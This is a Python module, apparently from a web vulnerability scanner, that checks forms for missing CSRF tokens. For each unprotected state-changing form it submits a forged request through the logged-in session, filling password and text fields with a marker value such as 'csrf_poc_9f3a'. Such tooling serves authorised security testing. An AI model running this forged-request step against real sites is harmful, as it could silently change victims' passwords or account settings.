import requests
from colorama import Fore, init
from bs4 import BeautifulSoup
import re

init(autoreset=True)

class CSRFScanner:
    """
    Detects CSRF vulnerabilities by checking whether state-changing
    forms include a CSRF token. If no token exists, we prove real
    impact by forging a password-change request on behalf of the
    currently logged-in user — without their interaction.

    A CSRF token is a secret random value the server embeds in
    forms and validates on submission. Without it, any site can
    trick a victim's browser into silently submitting forms to
    the vulnerable site using the victim's existing session.
    """

    def __init__(self, session, base_url="http://127.0.0.1"):
        self.session = session
        self.base_url = base_url.rstrip("/")
        self.findings = []

    # ─────────────────────────────────────────────
    # CHECK — does this form have a CSRF token?
    # ─────────────────────────────────────────────
    def check_form_for_token(self, url, form):
        inputs = form["inputs"]
        method = form["method"]

        # Token-like field names to look for
        token_field_names = ["token", "csrf", "user_token", "_token",
                             "nonce", "authenticity_token", "__requestverificationtoken"]

        for inp in inputs:
            name = inp["name"].lower()
            if any(t in name for t in token_field_names):
                print(f"{Fore.GREEN}[+] CSRF token found: '{inp['name']}' in {url}")
                return True

        # No token found on a form that changes state
        print(f"{Fore.YELLOW}[!] No CSRF token on {url} [{method.upper()}] — potentially vulnerable")
        return False

    # ─────────────────────────────────────────────
    # EXPLOITATION — forge a real state-changing request using
    # the form's OWN fields (generic), not hardcoded DVWA fields.
    # We can't know the "success" string for an arbitrary target,
    # so we report the raw response and let the response length/
    # content change speak for itself, plus flag common success
    # keywords as a heuristic signal.
    # ─────────────────────────────────────────────
    def exploit_csrf(self, url, method, form):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   CSRF EXPLOITATION -> {url}")
        print(f"{Fore.CYAN}{'='*55}\n")

        print(f"{Fore.BLUE}[*] Forging a request using this form's own fields "
              f"(no token) as the logged-in user...")
        print(f"{Fore.BLUE}[*] This simulates an attacker page silently submitting")
        print(f"{Fore.BLUE}    the victim's form without their knowledge\n")

        # Build forged params from the form's actual inputs — fill
        # text/password-like fields with a marker value so we can
        # tell if the request was accepted, leave submit buttons as-is
        forged_data = {}
        for inp in form["inputs"]:
            name = inp["name"]
            itype = inp.get("type", "text")
            if itype == "submit":
                forged_data[name] = inp.get("value", "Submit")
            elif itype in ("password", "text", "email"):
                forged_data[name] = "csrf_poc_9f3a"
            else:
                forged_data[name] = inp.get("value", "")

        try:
            if method == "post":
                baseline = self.session.post(url, data={}, timeout=10)
                resp = self.session.post(url, data=forged_data, timeout=10)
            else:
                baseline = self.session.get(url, timeout=10)
                resp = self.session.get(url, params=forged_data, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Request failed: {e}")
            return None

        success_keywords = ["success", "updated", "changed", "saved", "welcome"]
        body_lower = resp.text.lower()
        length_diff = abs(len(resp.text) - len(baseline.text))
        keyword_hit = any(k in body_lower for k in success_keywords)

        if keyword_hit or length_diff > 30:
            print(f"{Fore.RED}[!] CSRF EXPLOIT LIKELY SUCCESSFUL")
            print(f"{Fore.RED}    Forged request with marker value 'csrf_poc_9f3a' was "
                  f"accepted with no token")
            print(f"{Fore.RED}    Response changed by {length_diff} bytes vs. baseline"
                  + (f", success keyword matched" if keyword_hit else ""))
            return {
                "forged_url": resp.url,
                "forged_fields": forged_data,
                "length_diff": length_diff,
                "keyword_matched": keyword_hit,
                "impact": "Attacker-controlled request accepted on victim's session with no CSRF protection"
            }
        else:
            print(f"{Fore.YELLOW}[?] Forged request sent, but no clear success signal "
                  f"in the response — manual verification recommended")
            return None

    # ─────────────────────────────────────────────
    # SCAN ALL DISCOVERED FORMS
    # ─────────────────────────────────────────────
    def scan_all(self, discovered_forms):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   CSRF VULNERABILITY SCAN")
        print(f"{Fore.CYAN}{'='*55}\n")

        # State-changing methods and URLs worth checking
        # GET forms can be CSRF-vulnerable too if they change state
        state_changing_keywords = [
            "csrf", "change", "update", "delete",
            "password", "profile", "account", "settings"
        ]

        for url, forms in discovered_forms.items():
            for form in forms:
                method = form["method"]
                action = form["action"]

                # Only check forms that might change state
                url_lower = url.lower() + action.lower()
                is_state_changing = (
                    method == "post" or
                    any(kw in url_lower for kw in state_changing_keywords)
                )

                if not is_state_changing:
                    continue

                has_token = self.check_form_for_token(url, form)

                if not has_token:
                    exploit_result = self.exploit_csrf(action, method, form)

                    self.findings.append({
                        "type":           "CSRF",
                        "severity":       "HIGH",
                        "url":            url,
                        "method":         method,
                        "form_action":    action,
                        "exploitation":   exploit_result
                    })

        print(f"\n{Fore.CYAN}[*] CSRF scan complete: {len(self.findings)} finding(s)")
        return self.findings
